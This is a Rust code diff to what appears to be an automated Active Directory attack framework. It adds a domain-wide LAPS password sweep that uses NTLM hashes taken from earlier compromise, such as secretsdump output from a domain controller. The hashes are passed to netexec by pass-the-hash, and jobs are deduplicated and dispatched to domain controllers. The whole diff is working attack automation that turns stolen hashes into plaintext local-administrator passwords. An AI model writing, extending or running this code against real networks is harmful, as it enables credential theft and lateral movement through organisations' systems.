@@ -124,6 +124,7 @@ pub async fn auto_laps_extraction(
                             Some(target_computer.to_string())
                         },
                         credential: cred,
+                        nt_hash: None,
                         vuln_id: Some(vuln.vuln_id.clone()),
                     });
                 }
@@ -157,9 +158,61 @@ pub async fn auto_laps_extraction(
                         dc_ip,
                         target_computer: None,
                         credential: cred.clone(),
+                        nt_hash: None,
                         vuln_id: None,
                     });
                 }
+            }
+
+            // Path 2b: Domain-wide LAPS sweep via NTLM hash (pass-the-hash).
+            // A LAPS-reader principal may only exist in state.hashes (e.g.
+            // surfaced by secretsdump on the DC) without a plaintext password.
+            // Treat each NTLM hash as a sweep credential and -H instead of -p.
+            for h in state.hashes.iter().filter(|h| {
+                !h.domain.is_empty()
+                    && h.hash_type.to_lowercase() == "ntlm"
+                    && !h.hash_value.is_empty()
+                    && !state.is_delegation_account(&h.username)
+                    && !state.is_principal_quarantined(&h.username, &h.domain)
+            }) {
+                // Same dedup key namespace as plaintext sweep so we don't
+                // re-dispatch for a principal we already covered via password.
+                let dedup_key = format!(
+                    "{DEDUP_LAPS}:sweep:{}:{}",
+                    h.domain.to_lowercase(),
+                    h.username.to_lowercase()
+                );
+                if state.is_processed(DEDUP_LAPS, &dedup_key) {
+                    continue;
+                }
+
+                let dc_ip = state
+                    .domain_controllers
+                    .get(&h.domain.to_lowercase())
+                    .cloned();
+                if dc_ip.is_none() {
+                    continue;
+                }
+
+                items.push(LapsWork {
+                    dedup_key,
+                    domain: h.domain.clone(),
+                    dc_ip,
+                    target_computer: None,
+                    credential: ares_core::models::Credential {
+                        id: String::new(),
+                        username: h.username.clone(),
+                        password: String::new(),
+                        domain: h.domain.clone(),
+                        source: "hash_fallback".into(),
+                        discovered_at: None,
+                        is_admin: false,
+                        parent_id: None,
+                        attack_step: 0,
+                    },
+                    nt_hash: Some(h.hash_value.clone()),
+                    vuln_id: None,
+                });
             }
 
             // Limit to avoid spamming
@@ -182,6 +235,9 @@ pub async fn auto_laps_extraction(
                 },
             });
 
+            if let Some(ref hash) = item.nt_hash {
+                payload["nt_hash"] = json!(hash);
+            }
             if let Some(ref dc) = item.dc_ip {
                 payload["target_ip"] = json!(dc);
                 payload["dc_ip"] = json!(dc);
@@ -229,6 +285,10 @@ struct LapsWork {
     dc_ip: Option<String>,
     target_computer: Option<String>,
     credential: ares_core::models::Credential,
+    /// Pass-the-hash material when no plaintext password is available. When
+    /// `Some`, the dispatch payload sets `nt_hash` and downstream `laps_dump`
+    /// routes to `netexec -H` instead of `-p`.
+    nt_hash: Option<String>,
     vuln_id: Option<String>,
 }
 
